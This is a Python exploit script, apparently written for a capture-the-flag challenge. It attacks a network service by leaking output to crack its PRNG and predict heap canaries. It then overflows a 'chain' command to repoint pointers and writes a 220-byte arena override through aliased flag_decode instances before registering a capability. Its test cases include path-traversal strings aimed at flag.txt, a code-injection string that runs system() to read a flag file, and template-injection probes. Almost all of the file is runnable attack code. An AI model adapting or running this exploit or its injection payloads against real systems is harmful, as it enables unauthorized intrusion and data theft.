#!/usr/bin/env python3
"""Build a 220-byte arena override using chain plus flag_decode aliases.

The canonical flag_decode instance is used as a meta-writer.  Chain redirects
it successively to alias outer objects at offsets 0x110, 0x210, ...; a one-byte
canonical write plus its automatic NUL turns each alias pointer into an
override-segment pointer below arena+0x100.  The aliases then write contiguous
55-byte pieces without triggering any instance's two-strike low-byte guard.
"""

from __future__ import annotations

import argparse
import re
import sys
import urllib.parse

import override_catalog as oc  # noqa: E402
import predict_canary as pc  # noqa: E402


UUID = re.compile(rb"[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}", re.I)
FORBIDDEN_CHAIN = {0, 10, 13, 59}
NBSP = "\N{NO-BREAK SPACE}".encode()


class Exploit:
    def __init__(self, host: str, port: int, segments: int, leaks: int = 40):
        if not 1 <= segments <= 4:
            raise ValueError("this stash-backed layout supports 1..4 segments")
        self.client = oc.Client(host, port)
        self.segments = segments
        self.aliases = [b"flag_decode" + NBSP * i for i in range(1, segments + 1)]
        self.cursor = 0
        self.future: list[int] = []
        self.prepared = False

        oc.load_direct(self.client, b"whoami", b"newuser")
        who = self.client.cmd(b"whoami")
        hit = UUID.search(who)
        if not hit:
            raise RuntimeError(f"no UUID in {who!r}")
        self.sid = hit.group(0)
        for name in (b"stash", b"recall", b"chain", b"flag_decode", *self.aliases):
            oc.load_direct(self.client, name, self.sid)

        observed = [oc.leak_once(self.client) for _ in range(leaks)]
        found = list(pc.candidates(observed))
        if len(found) != 1:
            raise RuntimeError(f"PRNG candidates={len(found)}")
        key, _initial, mixer, state = found[0]
        for _ in observed:
            _, state = pc.step(state)
        self.future = pc.predict(key, mixer, state, 0, 256)

    def consume(self, count: int) -> None:
        self.cursor += count

    def stash(self) -> bytes:
        out = self.client.cmd(b"stash 41")
        if b"stored" not in out:
            raise RuntimeError(f"stash failed: {out!r}")
        self.consume(1)
        return out

    def initialize_layout(self) -> None:
        # slot0 override; note0 slot1; canonical outer/key slots2/3.
        expected_index = self.cursor
        self.stash()
        actual = oc.trailer_from_recall(self.client.cmd(b"recall 0 64"))
        if actual != self.future[expected_index]:
            raise RuntimeError(
                f"prediction drift {actual:04x}!={self.future[expected_index]:04x}"
            )
        self.client.cmd(b"flag_decode A")
        self.consume(2)

        # alias1 outer/key slots4/5.  Two fillers then force later alias outers
        # to slots8,12,16, all with low address byte 0x10.
        for index, alias in enumerate(self.aliases):
            if index:
                self.stash()
                self.stash()
            out = self.client.cmd(alias + b" A")
            if b"invalid" in out.lower():
                raise RuntimeError(f"alias init failed: {alias!r}: {out!r}")
            self.consume(2)

        out = self.client.cmd(b"stash purge 0")
        if b"dropped" not in out:
            raise RuntimeError(f"could not free slot1: {out!r}")

    def chain_repoint_canonical(self, alias_outer_offset: int) -> None:
        # Skip wire-hostile trailer canaries with a harmless alloc/free.
        while any(x in FORBIDDEN_CHAIN for x in self.future[self.cursor].to_bytes(2, "little")):
            self.client.cmd(b"chain whoami")
            self.consume(1)
        target = alias_outer_offset.to_bytes(2, "little")
        if 0 in target:
            raise AssertionError(target)
        payload = bytearray(b"no_such_cap ") + b"\\A" * 22
        payload = payload[:56].ljust(56, b"A")
        payload += self.future[self.cursor].to_bytes(2, "little")
        payload += b"BBBBBB" + target
        if any(x in FORBIDDEN_CHAIN for x in payload):
            raise RuntimeError("chain payload has a delimiter")
        self.client.cmd(b"chain " + payload)
        self.consume(1)

    def configure_aliases(self) -> None:
        for index in range(self.segments):
            alias_outer = 0x110 + 0x100 * index
            destination = 0x10 + 55 * index
            if destination >= 0x100:
                raise RuntimeError("current one-byte+NUL meta-pointer construction exceeded band 0")
            self.chain_repoint_canonical(alias_outer)
            # Writes destination.low8 then automatic NUL into pointer byte 1;
            # untouched bytes 2..7 already identify this arena.
            out = self.client.cmd(b"flag_decode " + bytes((destination,)))
            if b"key buffer state invalid" in out.lower():
                raise RuntimeError(f"canonical meta-write rejected at {alias_outer:#x}: {out!r}")

    def prepare(self) -> None:
        if self.prepared:
            return
        self.initialize_layout()
        self.configure_aliases()
        self.prepared = True

    def write_configured(self, value: bytes) -> None:
        if not 1 <= len(value) <= self.segments * 55:
            raise ValueError(f"value length must be 1..{self.segments * 55}")
        encoded = urllib.parse.quote_from_bytes(value, safe="-._~")
        if len(encoded) > 1022:
            raise ValueError("host session URL encoder's 0x400-byte output would reject this value")
        if not self.prepared:
            raise RuntimeError("call prepare() before write_configured()")
        for index, alias in enumerate(self.aliases):
            piece = value[index * 55:(index + 1) * 55]
            if not piece:
                break
            if b"\x00" in piece or b"\r" in piece or b"\n" in piece:
                raise ValueError("a flag_decode command piece cannot contain NUL/CR/LF")
            out = self.client.cmd(alias + b" " + piece)
            if b"key buffer state invalid" in out.lower():
                raise RuntimeError(f"alias write rejected at piece {index}: {out!r}")

    def write(self, value: bytes) -> None:
        self.prepare()
        self.write_configured(value)

    def close(self) -> None:
        self.client.s.close()


def cases() -> dict[str, bytes]:
    prefix = b"P" * 55
    return {
        "benign": prefix + b"MARKER_SUFFIX_80_BYTES" + b"Q" * 10,
        "long220": b"L" * 219 + b"Z",
        "path": prefix + b"../../../../flag.txt",
        "winpath": prefix + b"..\\..\\..\\..\\flag.txt",
        "codegen": prefix + b'\";system(\"cmd/c/type<C:\\\\flag.txt\");/*',
        "template": prefix + b"{{7*7}}${7*7}<%=7*7%>",
    }


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=4445)
    parser.add_argument("--case", choices=cases(), default="benign")
    parser.add_argument("--load-name", default="probe_cap")
    parser.add_argument("--password-mode", choices=("prefix55", "prefix127", "full"), default="prefix55")
    parser.add_argument("--remote", action="store_true", help="explicit acknowledgement for a non-loopback endpoint")
    args = parser.parse_args()
    if args.host not in {"127.0.0.1", "localhost", "::1"} and not args.remote:
        parser.error("non-loopback use requires --remote")
    value = cases()[args.case]
    segments = (len(value) + 54) // 55
    exploit = Exploit(args.host, args.port, segments)
    try:
        exploit.write(value)
        password = value[:55] if args.password_mode == "prefix55" else value[:127] if args.password_mode == "prefix127" else value
        if len(password) > 127 or any(x in password for x in (b" ", b"\x00", b"\r", b"\n")):
            raise ValueError("selected password cannot pass add_capability's token/length checks")
        result = exploit.client.cmd(
            b"add_capability " + args.load_name.encode("ascii") + b" " + password
        )
        print(f"case={args.case} value_len={len(value)} password_len={len(password)} mode={args.password_mode}")
        print(f"value={value!r}")
        print(f"load={result!r}")
    finally:
        exploit.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
